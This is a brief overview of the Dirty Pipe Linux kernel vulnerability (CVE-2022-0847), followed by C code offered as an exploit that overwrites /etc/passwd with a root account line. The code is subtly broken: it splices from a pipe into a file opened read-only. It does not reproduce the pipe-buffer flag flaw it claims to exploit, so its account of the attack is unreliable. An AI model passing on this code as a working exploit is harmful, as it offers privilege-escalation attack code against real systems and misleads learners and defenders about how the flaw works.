### **Dirty Pipe Vulnerability (CVE-2022-0847) Overview**
The Dirty Pipe vulnerability allows an attacker to overwrite read-only files in the Linux kernel by exploiting a flaw in the `splice()` system call. This can lead to privilege escalation, enabling unauthorized access to sensitive system files (e.g., `/etc/shadow`, `/etc/passwd`).

---

### **Example Exploit Code**
Below is a simplified example demonstrating how the vulnerability could be exploited. **This code is for educational purposes only and will only work on unpatched kernels (pre-5.16.11, 5.15.25, etc.).**

```c
#include <fcntl.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#define TARGET_FILE "/etc/passwd"  // Example target file
#define OFFSET 0                   // Offset to overwrite
#define PAYLOAD "root:x:0:0:root:/root:/bin/bash\n"  // Example payload

int main() {
    int fd = open(TARGET_FILE, O_RDONLY);  // Open target file as read-only
    if (fd < 0) {
        perror("open");
        return 1;
    }

    int pipefd[2];
    if (pipe(pipefd) < 0) {
        perror("pipe");
        return 1;
    }

    // Write payload to the pipe
    write(pipefd[1], PAYLOAD, strlen(PAYLOAD));
    close(pipefd[1]);  // Close write end

    // Seek to the desired offset in the target file
    lseek(fd, OFFSET, SEEK_SET);

    // Exploit the vulnerability using splice()
    ssize_t bytes = syscall(SYS_splice, pipefd[0], NULL, fd, NULL, strlen(PAYLOAD), 0);
    if (bytes < 0) {
        perror("splice");
        return 1;
    }

    close(pipefd[0]);
    close(fd);
    printf("Exploit completed. Check the target file for changes.\n");
    return 0;
}
```

